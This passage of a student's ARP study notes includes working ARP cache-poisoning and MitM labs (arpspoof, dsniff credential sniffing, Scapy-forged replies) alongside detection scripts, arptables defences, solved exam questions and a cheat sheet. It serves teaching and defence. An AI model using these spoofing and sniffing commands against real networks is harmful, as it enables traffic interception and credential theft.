# (Intercept Metasploitable2's outbound traffic)
sudo arpspoof -i vboxnet0 -t 192.168.56.102 192.168.56.1 &

# Terminal 2: Tell Gateway that "192.168.56.102 (Metasploitable2) is at Parrot's MAC"
# (Intercept return traffic back to Metasploitable2)
sudo arpspoof -i vboxnet0 -t 192.168.56.1 192.168.56.102 &

# ── Verify the ARP cache is now poisoned ──────────────────────────────────────

# On Metasploitable2 (check ARP cache after attack):
# arp -n
# BEFORE: 192.168.56.1 → GG:GG:GG:GG:GG:GG  (real gateway MAC)
# AFTER:  192.168.56.1 → EE:EE:EE:EE:EE:EE  (Parrot's MAC!) ← POISONED

# On Parrot OS: watch the traffic being intercepted
sudo tcpdump -i vboxnet0 -n "host 192.168.56.102" -v

# Generate some traffic from Metasploitable2:
# (On Metasploitable2) curl http://testmyip.com
# You should see this traffic PASS THROUGH Parrot OS (because you enabled ip_forward)

# ── Stop the attack and restore ARP caches ────────────────────────────────────

# Kill arpspoof processes:
sudo killall arpspoof

# arpspoof automatically sends corrective ARP replies when stopped
# (restores correct MAC mappings)

# Verify restoration on Metasploitable2:
# arp -n
# 192.168.56.1 should be back to the real gateway MAC

# Disable IP forwarding after lab:
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### Lab 3 — MitM via ARP Poisoning (intercept your own web app traffic)

```bash
# PURPOSE: Show how ARP poisoning MitM captures your own MERN/PERN web app traffic
# SCENARIO: Metasploitable2 visits your Node.js app running on Parrot OS
#           Parrot also acts as attacker — intercepts AND serves the app

# ── Step 1: Start your Node.js/Express app on Parrot OS ──────────────────────
# (assuming you have a MERN/PERN project ready)
cd ~/your-mern-project
npm start &
# App running on http://192.168.56.101:3000

# ── Step 2: ARP poison Metasploitable2 to intercept its traffic ──────────────

echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward

# Poison Metasploitable2 → gateway route:
sudo arpspoof -i vboxnet0 -t 192.168.56.102 192.168.56.1 &

# ── Step 3: Capture HTTP traffic from Metasploitable2 ────────────────────────

# Option A: raw tcpdump
sudo tcpdump -i vboxnet0 -n -A \
  "host 192.168.56.102 and tcp port 80 or tcp port 3000"

# Option B: dsniff — extracts and displays credentials/usernames automatically
sudo dsniff -i vboxnet0

# Option C: urlsnarf — shows URLs being visited
sudo urlsnarf -i vboxnet0

# ── Step 4: From Metasploitable2 — browse your web app ───────────────────────
# On Metasploitable2:
# curl http://192.168.56.101:3000/api/login \
#   -X POST \
#   -H "Content-Type: application/json" \
#   -d '{"username":"admin","password":"mysecret123"}'

# On Parrot OS (in tcpdump output) you will see:
# POST /api/login HTTP/1.1
# {"username":"admin","password":"mysecret123"}
# ← The password is visible in PLAINTEXT because your app uses HTTP not HTTPS

# ── Step 5: What this teaches you about your web projects ────────────────────

echo "Security findings from this lab:"
echo ""
echo "VULNERABILITY: Node.js app running on HTTP (port 3000)"
echo "IMPACT: ARP poisoning + MitM captures ALL API traffic including passwords"
echo ""
echo "FIXES:"
echo "  1. Always use HTTPS even in development (self-signed cert is fine for dev)"
echo "  2. Use HSTS (HTTP Strict Transport Security) header in production"
echo "  3. Hash passwords CLIENT-SIDE before sending (or ideally just use HTTPS)"
echo "  4. Use JWT with short expiry — even if stolen, it expires quickly"
echo "  5. Implement certificate pinning for mobile API clients"
echo ""
echo "GENERATE SELF-SIGNED CERT for dev:"
openssl req -x509 -nodes -days 365 -newkey rsa:2048 \
  -keyout /tmp/dev-key.pem \
  -out /tmp/dev-cert.pem \
  -subj "/CN=localhost"
echo "Use these in your Express app:"
echo "  const https = require('https');"
echo "  const fs = require('fs');"
echo "  const options = { key: fs.readFileSync('/tmp/dev-key.pem'),"
echo "                    cert: fs.readFileSync('/tmp/dev-cert.pem') };"
echo "  https.createServer(options, app).listen(3443);"

# Cleanup:
sudo killall arpspoof
echo 0 | sudo tee /proc/sys/net/ipv4/ip_forward
```

---

### Lab 4 — Craft ARP Packets with Scapy

```python
#!/usr/bin/env python3
# Save as: arp_scapy_lab.py
# Run:     sudo python3 arp_scapy_lab.py
# PURPOSE: Understand ARP by crafting packets from scratch at the byte level

from scapy.all import *
import time

print("="*65)
print("ARP PACKET CRAFTING LAB — SCAPY")
print("="*65)

# ─── Lab 4a: Craft and inspect an ARP Request ────────────────────────────────

print("\n" + "─"*65)
print("LAB 4a: ARP REQUEST — Structure and Fields")
print("─"*65)

# Craft a standard ARP Request
arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=1,                          # Operation: 1 = Request
    hwsrc="aa:aa:aa:aa:aa:aa",    # Sender MAC (A's MAC)
    psrc="192.168.1.10",           # Sender IP (A's IP)
    hwdst="00:00:00:00:00:00",    # Target MAC (unknown — fill with zeros)
    pdst="192.168.1.30"            # Target IP (C's IP — what we want to resolve)
)

print("\n[ARP Request] Full packet structure:")
arp_request.show()

print(f"\n  Ethernet Frame:")
print(f"    Destination MAC: {arp_request[Ether].dst}  (FF:FF:FF:FF:FF:FF = BROADCAST)")
print(f"    Source MAC:      {arp_request[Ether].src}")
print(f"    EtherType:       0x{arp_request[Ether].type:04X}  (0x0806 = ARP)")

print(f"\n  ARP Header:")
print(f"    HTYPE (Hardware Type):      {arp_request[ARP].hwtype}  (1 = Ethernet)")
print(f"    PTYPE (Protocol Type):      0x{arp_request[ARP].ptype:04X}  (0x0800 = IPv4)")
print(f"    HLEN  (Hardware Addr Len):  {arp_request[ARP].hwlen}  bytes (6 = 48-bit MAC)")
print(f"    PLEN  (Protocol Addr Len):  {arp_request[ARP].plen}  bytes (4 = 32-bit IPv4)")
print(f"    OPER  (Operation):          {arp_request[ARP].op}  (1 = REQUEST)")
print(f"    Sender MAC:                 {arp_request[ARP].hwsrc}")
print(f"    Sender IP:                  {arp_request[ARP].psrc}")
print(f"    Target MAC:                 {arp_request[ARP].hwdst}  (unknown = zeros)")
print(f"    Target IP:                  {arp_request[ARP].pdst}  (IP we are looking up)")
print(f"\n  Total ARP payload size: {len(arp_request[ARP])} bytes")
print(f"  Total packet size:     {len(arp_request)} bytes")

# ─── Lab 4b: Craft an ARP Reply ──────────────────────────────────────────────

print("\n" + "─"*65)
print("LAB 4b: ARP REPLY — Structure and Fields")
print("─"*65)

arp_reply = Ether(dst="aa:aa:aa:aa:aa:aa") / ARP(
    op=2,                           # Operation: 2 = Reply
    hwsrc="cc:cc:cc:cc:cc:cc",     # Sender MAC (C's MAC — THE ANSWER)
    psrc="192.168.1.30",            # Sender IP (C's IP)
    hwdst="aa:aa:aa:aa:aa:aa",     # Target MAC (A's MAC — reply goes to A)
    pdst="192.168.1.10"             # Target IP (A's IP)
)

print("\n[ARP Reply] Full packet structure:")
arp_reply.show()
print(f"\n  Ethernet Frame destination: {arp_reply[Ether].dst}  (A's specific MAC — UNICAST)")
print(f"  ARP Operation:              {arp_reply[ARP].op}  (2 = REPLY)")
print(f"  THE ANSWER: IP {arp_reply[ARP].psrc} is at MAC {arp_reply[ARP].hwsrc}")

# ─── Lab 4c: Craft a FAKE ARP Reply (Spoofing simulation) ────────────────────

print("\n" + "─"*65)
print("LAB 4c: FAKE ARP REPLY — ARP Spoofing Simulation")
print("─"*65)

# Attacker (EE:EE:EE:EE:EE:EE) pretends to be the gateway (192.168.1.1)
# Sends to victim A: "192.168.1.1 (gateway) is at EE:EE:EE:EE:EE:EE (attacker)"

fake_arp = Ether(dst="aa:aa:aa:aa:aa:aa") / ARP(
    op=2,                           # Reply
    hwsrc="ee:ee:ee:ee:ee:ee",     # LIE: attacker's MAC claiming to be gateway
    psrc="192.168.1.1",             # LIE: claiming this is the gateway's IP
    hwdst="aa:aa:aa:aa:aa:aa",     # Sending to victim A
    pdst="192.168.1.10"
)

print("\n[FAKE ARP Reply] — ARP Spoofing packet:")
fake_arp.show()
print(f"\n  WHAT VICTIM A WILL BELIEVE AFTER RECEIVING THIS:")
print(f"    192.168.1.1 (gateway) → ee:ee:ee:ee:ee:ee  ← WRONG (attacker's MAC)")
print(f"  WHAT IS ACTUALLY TRUE:")
print(f"    192.168.1.1 (gateway) → gg:gg:gg:gg:gg:gg  ← REAL gateway MAC")
print(f"\n  IMPACT: All traffic from A to internet goes to the ATTACKER instead of gateway")
print(f"  ARP has NO authentication → victim cannot verify this reply is fake")

# ─── Lab 4d: ARP Probe (used in duplicate address detection) ─────────────────

print("\n" + "─"*65)
print("LAB 4d: ARP PROBE — Duplicate Address Detection")
print("─"*65)

# ARP Probe: sender IP = 0.0.0.0 (checking if anyone else has the target IP)
# Used by devices when they first get an IP (DHCP) to check it's not already in use
arp_probe = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=1,
    hwsrc="aa:aa:aa:aa:aa:aa",
    psrc="0.0.0.0",                # Sender IP = 0.0.0.0 in a probe
    hwdst="00:00:00:00:00:00",
    pdst="192.168.1.10"            # IP we want to claim — checking if anyone has it
)

print("\n[ARP Probe] — Used for Duplicate Address Detection (DAD):")
arp_probe.show()
print(f"  Sender IP = 0.0.0.0 means: 'I want this IP but haven't claimed it yet'")
print(f"  If anyone replies: 'IP conflict! Someone already has 192.168.1.10'")
print(f"  If no reply: safe to use the IP")

# ─── Lab 4e: Gratuitous ARP ───────────────────────────────────────────────────

print("\n" + "─"*65)
print("LAB 4e: GRATUITOUS ARP — Update Everyone's Cache")
print("─"*65)

# Gratuitous ARP: a device sends ARP Reply for its OWN IP, unsolicited
# Used to update caches when MAC changes (NIC replaced, failover, etc.)
# Also used by ATTACKERS to poison caches without waiting for a request

gratuitous_arp = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(
    op=2,                           # Reply (even though nobody requested it)
    hwsrc="aa:aa:aa:aa:aa:aa",     # Sender's own MAC
    psrc="192.168.1.10",            # Sender's own IP (sender = target)
    hwdst="ff:ff:ff:ff:ff:ff",     # Broadcast
    pdst="192.168.1.10"             # Same IP — target = sender (gratuitous)
)

print("\n[Gratuitous ARP] — Unsolicited ARP Reply:")
gratuitous_arp.show()
print(f"  Sender IP = Target IP = same address")
print(f"  Purpose (legitimate): announce MAC change to update all neighbour caches")
print(f"  Purpose (malicious):  poison all neighbour caches without waiting for request")
print(f"  Attacker can send gratuitous ARP any time → poisons every device's cache")
print(f"  This is why ARP poisoning works WITHOUT needing to wait for ARP Requests")
```

---

### Lab 5 — Detect and Defend Against ARP Poisoning

```bash
# PURPOSE: Detect ARP poisoning in real time and implement defences

# ── Detection Method 1: arpwatch ─────────────────────────────────────────────

# Install arpwatch:
sudo apt install arpwatch -y

# Start arpwatch (monitors ARP traffic and alerts on suspicious changes):
sudo arpwatch -i vboxnet0 -f /tmp/arp.dat

# arpwatch alerts on:
#   "new station" — new MAC/IP pair seen for first time
#   "changed ethernet address" — an IP's MAC address changed (POISONING INDICATOR!)
#   "flip flop" — MAC flips between two values (active ARP spoofing indicator!)
#   "bogon" — packet from unknown/unregistered address

# Watch the arpwatch log:
sudo tail -f /var/log/syslog | grep arpwatch

# When ARP poisoning occurs against this machine, you'll see:
# arpwatch: changed ethernet address  192.168.56.1  gg:gg:gg:gg:gg:gg → ee:ee:ee:ee:ee:ee

# ── Detection Method 2: Manual ARP cache inspection ───────────────────────────

# Check for duplicate MAC addresses in ARP cache:
# Two different IPs with the SAME MAC = likely ARP poisoning

arp -n | awk '{print $3}' | sort | uniq -d
# If any MAC appears twice → potential ARP spoofing

# More detailed check:
ip neigh show | awk '{print $5}' | sort | uniq -c | sort -rn
# Format: count MAC_address
# count > 1 → that MAC is mapped to multiple IPs → suspicious

# ── Detection Method 3: Capture and analyse ARP with Wireshark ───────────────

sudo tcpdump -i vboxnet0 -n "arp" -v -w /tmp/arp_monitor.pcap

# In Wireshark, look for:
# Filter: arp.duplicate-address-detected   → Wireshark auto-detects conflicts
# Filter: arp.opcode == 2 and arp.src.hw_mac == KNOWN_BAD_MAC
# Blue info messages: "Duplicate IP address detected"

# ── Detection Method 4: Python script to detect ARP poisoning ────────────────

cat << 'EOF' > /tmp/arp_detector.py
#!/usr/bin/env python3
"""
ARP Poisoning Detector — run on your own network/lab only
Usage: sudo python3 /tmp/arp_detector.py
"""
from scapy.all import *
import time

# Map of IP → MAC — tracks what we've seen
arp_table = {}

def detect_arp_poison(packet):
    if not packet.haslayer(ARP):
        return
    if packet[ARP].op != 2:  # Only check replies
        return

    sender_ip  = packet[ARP].psrc
    sender_mac = packet[ARP].hwsrc

    if sender_ip in arp_table:
        if arp_table[sender_ip] != sender_mac:
            print(f"\n{'!'*50}")
            print(f"⚠️  POSSIBLE ARP POISONING DETECTED!")
            print(f"   IP:       {sender_ip}")
            print(f"   Old MAC:  {arp_table[sender_ip]}  (trusted)")
            print(f"   New MAC:  {sender_mac}  (suspicious change!)")
            print(f"   Time:     {time.strftime('%H:%M:%S')}")
            print(f"{'!'*50}\n")
        # else: same MAC — no change, all good
    else:
        arp_table[sender_ip] = sender_mac
        print(f"[+] New ARP entry: {sender_ip} → {sender_mac}")

print("ARP Poisoning Detector running on vboxnet0...")
print("Watching for suspicious ARP cache changes...\n")
sniff(iface="vboxnet0", filter="arp", prn=detect_arp_poison, store=0)
EOF

sudo python3 /tmp/arp_detector.py &
# Now run the ARP spoofing from Lab 2 — this detector will catch it!

# ── Defence Method 1: Static ARP entries ─────────────────────────────────────

# Add a PERMANENT static ARP entry for your gateway:
# (static entries cannot be overwritten by ARP replies)
sudo arp -s 192.168.56.1 0a:00:27:00:00:00
# Replace 0a:00:27:00:00:00 with your actual gateway MAC

# Verify it's static:
arp -n
# Look for 'M' flag (Permanent/Manual) instead of 'C' (dynamic)

# ── Defence Method 2: Dynamic ARP Inspection (DAI) ───────────────────────────

# DAI is a SWITCH-level defence — switches check ARP against DHCP bindings
# Prevents unauthorised ARP replies from being forwarded
# Configurable on managed switches (Cisco Catalyst etc.)
# Home routers and VirtualBox: usually no DAI support
# Enterprise networks: should always enable DAI on untrusted ports

# On Linux (as a software switch / bridge):
# Install arptables:
sudo apt install arptables -y

# Block all ARP replies that claim gateway IP but come from unknown MACs:
# (replace with your real gateway IP and MAC)
sudo arptables -A INPUT \
  --opcode 2 \
  --arp-ip-src 192.168.56.1 \
  ! --arp-mac-src 0a:00:27:00:00:00 \
  -j DROP
# This rule: if ARP reply claims to be from gateway IP
#            but the source MAC is NOT the real gateway MAC → DROP

# Verify arptables rule:
sudo arptables -L

# Cleanup arptables after lab:
sudo arptables -F
```

---

## 10. Solved Examples

### Example 1 — Basic ARP Process

**Question:** Host A (IP: 10.0.0.5, MAC: AA:AA:AA:AA:AA:AA) wants to send a packet to Host B (IP: 10.0.0.8) on the same LAN. A does not have B's MAC address. Describe the complete ARP process, stating whether each message is broadcast or unicast.

```
Answer:

  Step 1: A checks its ARP cache for 10.0.0.8 → NOT FOUND
          A must perform ARP to discover B's MAC address.

  Step 2: A creates an ARP REQUEST packet:
            Operation:   1 (Request)
            Sender MAC:  AA:AA:AA:AA:AA:AA  (A's own MAC)
            Sender IP:   10.0.0.5           (A's own IP)
            Target MAC:  00:00:00:00:00:00  (unknown — fill with zeros)
            Target IP:   10.0.0.8           (the IP we are resolving)

  Step 3: A sends the ARP Request as a BROADCAST:
            Ethernet destination: FF:FF:FF:FF:FF:FF
            → Switch receives it → floods out ALL ports
            → EVERY device on the LAN receives this packet
            → Devices with IPs other than 10.0.0.8 silently discard it

  Step 4: B (10.0.0.8, MAC: BB:BB:BB:BB:BB:BB) receives the ARP Request.
          B checks Target IP: "10.0.0.8 is MY IP!" → B will reply.
          B also learns A's MAC from the Sender MAC field → stores in own ARP cache.

  Step 5: B creates an ARP REPLY packet:
            Operation:   2 (Reply)
            Sender MAC:  BB:BB:BB:BB:BB:BB  (B's MAC — THE ANSWER)
            Sender IP:   10.0.0.8           (B's IP)
            Target MAC:  AA:AA:AA:AA:AA:AA  (A's MAC — reply goes to A)
            Target IP:   10.0.0.5           (A's IP)

  Step 6: B sends the ARP Reply as a UNICAST:
            Ethernet destination: AA:AA:AA:AA:AA:AA  (A's specific MAC)
            → Switch delivers it ONLY to A
            → No other device receives this reply

  Step 7: A receives the ARP Reply.
          A learns: 10.0.0.8 → BB:BB:BB:BB:BB:BB
          A stores this in its ARP cache with a TTL.

  Step 8: A can now build the Ethernet frame and send the actual data to B.

  Summary:
    ARP Request: BROADCAST (FF:FF:FF:FF:FF:FF) — goes to EVERYONE
    ARP Reply:   UNICAST  (AA:AA:AA:AA:AA:AA) — goes ONLY to the requester
```

---

### Example 2 — ARP Header Field Values

**Question:** Fill in the values for each field of an ARP Request packet sent by Host A (IP: 192.168.10.5, MAC: 11:22:33:44:55:66) asking for the MAC address of Host C (IP: 192.168.10.20). Assume Ethernet and IPv4.

```
Answer:

  Field               Value         Explanation
  ─────────────────────────────────────────────────────────────────────
  HTYPE               1             Hardware type = Ethernet
  PTYPE               0x0800        Protocol type = IPv4
  HLEN                6             Hardware address length = 6 bytes (48-bit MAC)
  PLEN                4             Protocol address length = 4 bytes (32-bit IPv4)
  OPER                1             Operation = REQUEST (2 would be Reply)
  Sender MAC (SHA)    11:22:33:44:55:66   A's own MAC address
  Sender IP  (SPA)    192.168.10.5         A's own IP address
  Target MAC (THA)    00:00:00:00:00:00   Unknown — fill with zeros (what we want)
  Target IP  (TPA)    192.168.10.20        C's IP — the IP being resolved

  Additionally, the Ethernet frame wrapping this ARP packet:
    Source MAC:      11:22:33:44:55:66  (A's MAC)
    Destination MAC: FF:FF:FF:FF:FF:FF  (Broadcast — goes to everyone)
    EtherType:       0x0806             (ARP protocol identifier)
```

---

### Example 3 — Cross-Network Communication with ARP

**Question:** Host A (192.168.1.10) wants to send an email to Host Z (203.0.113.50) which is on a completely different network. The default gateway is at 192.168.1.1. Explain the role of ARP in this communication.

```
Answer:

  A recognises that 203.0.113.50 is NOT on its local subnet (192.168.1.0/24).
  Therefore A must route the packet through its default gateway.

  ARP IS NOT USED FOR Z'S MAC ADDRESS.
  Z is not on A's local LAN — its MAC is unreachable and irrelevant to A.

  Step 1: A determines it needs to use the Default Gateway (192.168.1.1).
  Step 2: A checks ARP cache for 192.168.1.1 → NOT FOUND.
  Step 3: A broadcasts an ARP Request:
            "Who has 192.168.1.1? Tell 192.168.1.10"
  Step 4: Default Gateway (MAC: GW:GW:GW:GW:GW:GW) responds (UNICAST):
            "192.168.1.1 is at GW:GW:GW:GW:GW:GW"
  Step 5: A stores in ARP cache: 192.168.1.1 → GW:GW:GW:GW:GW:GW
  Step 6: A builds the Ethernet frame:
            Destination MAC: GW:GW:GW:GW:GW:GW  (GATEWAY's MAC)
            Source MAC:      A's MAC
            IP Source:       192.168.1.10          (stays the same end-to-end)
            IP Destination:  203.0.113.50           (stays the same end-to-end)
  Step 7: Gateway receives the frame, strips the Layer 2 header.
  Step 8: Gateway reads IP Destination = 203.0.113.50 → routes it outward.
          At each subsequent hop, routers do their own ARP for the NEXT HOP's MAC.

  Key lesson:
    ARP is ONLY used to find the MAC of the NEXT HOP — not the final destination.
    On the first LAN: ARP finds the GATEWAY's MAC.
    On subsequent links: each router uses ARP to find the NEXT ROUTER's MAC.
    The final router uses ARP to find the DESTINATION HOST's MAC.
    The IP addresses (192.168.1.10 → 203.0.113.50) remain UNCHANGED throughout.
```

---

### Example 4 — Security: Why ARP is Dangerous

**Question:** Why is ARP considered a security vulnerability? What attack does this enable and how can it be prevented?

```
Answer:

  ROOT CAUSE — NO AUTHENTICATION:
    ARP was designed in 1982 for trusted networks with no authentication.
    Any device can send an ARP Reply claiming to own ANY IP address.
    No digital signatures, no certificates, no verification mechanism.
    Devices accept ARP Replies and update their caches unconditionally.

  THE ATTACK — ARP SPOOFING / ARP CACHE POISONING:
    An attacker on the same LAN sends fake ARP Replies to all devices.
    Example:
      Attacker tells Victim A: "The gateway (192.168.1.1) is at MY MAC"
      Attacker tells Gateway:  "Victim A (192.168.1.10) is at MY MAC"

    Both devices update their ARP caches with wrong information.
    Now all traffic between A and the gateway flows through the attacker.
    This is called MAN-IN-THE-MIDDLE (MitM).

    The attacker can:
      → Read plaintext traffic (HTTP, unencrypted protocols)
      → Modify traffic (inject scripts, change content)
      → Steal session cookies and credentials
      → Perform SSL stripping (force HTTPS to HTTP)
      → Conduct a Denial of Service (drop all traffic instead of forwarding)

  PREVENTION METHODS (layered defence):

    1. Static ARP entries:
       Manually configure the gateway's MAC → cannot be overwritten by fake replies
       Limitation: doesn't scale, impractical for large networks

    2. Dynamic ARP Inspection (DAI) on managed switches:
       Switch checks ARP replies against DHCP snooping binding table
       ARP reply for IP not in binding table → DROPPED by the switch
       Most effective enterprise-level defence

    3. ARP monitoring tools (arpwatch):
       Alert when an IP's MAC address changes unexpectedly
       Detects poisoning in progress

    4. Encryption (HTTPS/TLS):
       Even if ARP poisoning succeeds and MitM is achieved:
       Encrypted traffic cannot be read or meaningfully modified
       Certificate validation prevents SSL stripping (if HSTS is enabled)
       Best practice: use HTTPS everywhere, always

    5. VPN or IPsec:
       Encrypts all traffic at Layer 3 → ARP-level MitM cannot read content
```

---

## 11. Exam Cheat Sheet

```
╔══════════════════════════════════════════════════════════════════════════╗
║              ARP (Address Resolution Protocol) — EXAM CHEAT SHEET        ║
╠══════════════════════════════════════════════════════════════════════════╣
║  WHAT IS ARP?                                                              ║
║  → Converts IP address (logical) to MAC address (physical)               ║
║  → Layer: Network Layer (Layer 3) / Internet Layer (TCP/IP)              ║
║  → IPv4 only (IPv6 uses NDP — Neighbour Discovery Protocol)              ║
║  → RFC 826                                                                ║
║  → RESOLVES a known IP into an UNKNOWN MAC address                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║  THE MOST IMPORTANT RULE (memorise this):                                  ║
║  → ARP REQUEST  = always BROADCAST  (FF:FF:FF:FF:FF:FF)                 ║
║  → ARP REPLY    = always UNICAST    (sent only to the requester)         ║
╠══════════════════════════════════════════════════════════════════════════╣
║  WHY ARP IS NEEDED                                                         ║
║  IP address: public, known, used for routing (Layer 3)                   ║
║  MAC address: local/private, required for Ethernet frame delivery (L2)   ║
║  You MUST have BOTH to send a frame on a LAN                             ║
║  ARP discovers the missing MAC when you only know the IP                 ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ARP PROCESS STEPS                                                         ║
║  1. A wants to send to C, knows C's IP, doesn't know C's MAC            ║
║  2. A sends ARP REQUEST (BROADCAST) → "Who has IP_C? Tell IP_A"         ║
║  3. Every device on LAN receives it, non-matching IPs discard it         ║
║  4. C receives it: "That's my IP!" → C sends ARP REPLY (UNICAST)        ║
║  5. Reply: "IP_C is at MAC_C"                                            ║
║  6. A receives reply → stores IP_C → MAC_C in ARP CACHE                ║
║  7. A builds Ethernet frame with MAC_C → sends actual data              ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ARP HEADER FIELDS (memorise values for Ethernet/IPv4):                   ║
║  Field      Bits  Value                                                   ║
║  HTYPE      16    1        (Ethernet)                                     ║
║  PTYPE      16    0x0800   (IPv4)                                         ║
║  HLEN        8    6        (6 bytes = 48-bit MAC)                         ║
║  PLEN        8    4        (4 bytes = 32-bit IPv4)                        ║
║  OPER       16    1 = Request, 2 = Reply                                  ║
║  SHA        48    Sender's MAC                                            ║
║  SPA        32    Sender's IP                                             ║
║  THA        48    Target's MAC (00:00:00:00:00:00 in Request)            ║
║  TPA        32    Target's IP (the IP being resolved)                    ║
╠══════════════════════════════════════════════════════════════════════════╣
║  FOUR COMMUNICATION SCENARIOS (all use same ARP mechanism):               ║
║  1. Host → Host       ARP finds destination host's MAC (same LAN)       ║
║  2. Host → Router     ARP finds default gateway's MAC (to leave LAN)    ║
║  3. Router → Host     ARP finds host's MAC (router delivers locally)    ║
║  4. Router → Router   ARP finds next-hop router's MAC                   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ARP CACHE                                                                 ║
║  → Stores IP → MAC mappings after ARP exchange                          ║
║  → Avoids repeated ARP broadcasts for same destination                  ║
║  → Entries EXPIRE (timeout, typically 60–300 seconds)                   ║
║  → Dynamic entries: learned via ARP → can expire                        ║
║  → Static entries: manually set → do NOT expire → more secure           ║
║  → View cache: arp -n  OR  ip neigh show  (Linux)                       ║
╠══════════════════════════════════════════════════════════════════════════╣
║  SECURITY — ARP SPOOFING                                                   ║
║  Root cause:  ARP has NO authentication                                  ║
║  Attack:      Send fake ARP Reply claiming your MAC owns another IP      ║
║  Gratuitous:  Unsolicited ARP Reply — poisons caches without request     ║
║  Result:      ARP Cache Poisoning → MitM → capture/modify all traffic   ║
║  Defences:    Static ARP entries, DAI on switches, arpwatch, HTTPS/TLS  ║
╠══════════════════════════════════════════════════════════════════════════╣
║  KEY DIFFERENCES — ARP SPECIAL PACKETS                                     ║
║  Gratuitous ARP: reply for OWN IP, unsolicited, dst=broadcast            ║
║                  use: announce MAC change (legitimate) or cache poison   ║
║  ARP Probe:      request with sender IP = 0.0.0.0                       ║
║                  use: duplicate address detection (DAD) before claiming  ║
╠══════════════════════════════════════════════════════════════════════════╣
║  ARP vs NDP (common exam trap)                                             ║
║  ARP:  IPv4, uses Ethernet broadcast, no security built-in               ║
║  NDP:  IPv6, uses ICMPv6 multicast, SeND option for crypto security      ║
║  NDP replaces ARP in IPv6 — ARP is not used in IPv6 at all              ║
╠══════════════════════════════════════════════════════════════════════════╣
║  EXAM TRAPS                                                                ║
║  → ARP is Layer 3 but resolves Layer 2 addresses (bridges L2 and L3)   ║
║  → ARP Request = BROADCAST, NOT unicast                                  ║
║  → ARP Reply = UNICAST, NOT broadcast                                    ║
║  → ARP does NOT cross routers — it's LAN-local (routers separate ARPs) ║
║  → When sending cross-network: ARP finds the GATEWAY's MAC, not dest    ║
║  → Ethernet broadcast = FF:FF:FF:FF:FF:FF (twelve Fs, 48 bits)          ║
║  → ARP Request Target MAC field = 00:00:00:00:00:00 (all zeros)        ║
║  → ARP OPER field: 1 = Request, 2 = Reply (NOT 0 and 1)                ║
║  → IPv6 does NOT use ARP — uses NDP (ICMPv6) instead                   ║
╠══════════════════════════════════════════════════════════════════════════╣
║  MEMORY TRICKS                                                              ║
║  ARP  = "Address Resolution Protocol" = "Asking for the Real Person"    ║
║  Request = shout to the whole class (BROADCAST) "Who is Varun?"         ║
║  Reply   = Varun walks to you privately (UNICAST) "I am Varun"          ║
║  ARP Cache = your notebook where you wrote Varun's desk number          ║
║  ARP Spoofing = someone else shouts "I am Varun!" before Varun can      ║
╚══════════════════════════════════════════════════════════════════════════╝
```

---

## 📚 Next Topics

- [ ] **RARP — Reverse ARP** (MAC → IP, predecessor of DHCP, mostly obsolete)
- [ ] **DHCP — Dynamic Host Configuration Protocol** (automatic IP assignment, uses ARP probe)
- [ ] **NDP — Neighbour Discovery Protocol** (IPv6 replacement for ARP, ICMPv6-based)
- [ ] **ICMP — Internet Control Message Protocol** (ping, traceroute, error reporting)
- [ ] **ARP in Switched Networks** (how VLANs limit ARP broadcast domains)
- [ ] **Dynamic ARP Inspection (DAI)** — deep dive into switch-level ARP defence
- [ ] **SSL Stripping** — ARP poisoning + Bettercap to downgrade HTTPS
- [ ] **Bettercap** — modern MitM framework (ARP, DNS, HTTP/HTTPS interception)

---

_Notes compiled from: Networking Course — ARP (Address Resolution Protocol) (Gate Smashers)_
" "
_Environment: Parrot OS + Metasploitable2 + MERN/PERN Web Projects_
_Author: Cybersecurity Dept. Student_
